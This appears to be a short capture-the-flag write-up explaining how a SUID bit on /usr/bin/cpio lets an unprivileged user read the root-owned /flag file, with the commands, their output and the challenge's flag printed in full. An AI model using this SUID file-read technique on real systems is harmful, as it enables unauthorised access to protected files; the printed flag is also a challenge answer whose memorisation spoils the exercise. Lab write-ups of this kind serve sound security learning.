## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/cpio`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/cpio
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/cpio
```

-The `s` in `-rws` indicates it's a SUID binary.
-`cpio` runs with **root privileges**.

## 🚀 Exploitation

The `cpio` command in Linux just copies the content of a file to make a special archive file with .cpio extension.

We can simply cat the .cpio file to read contents of /flag

```bash
echo "/flag" | cpio -o > myflag.cpio
cat myflag.cpio
```

Output:
```
�q�vhl�:/flagpwn.college{sX5JKqLxT27oZ-lRdm_fF-WnI0C.dRjNxwSM0IzMyEzW}
�q
```
here we can clearly see the flag.
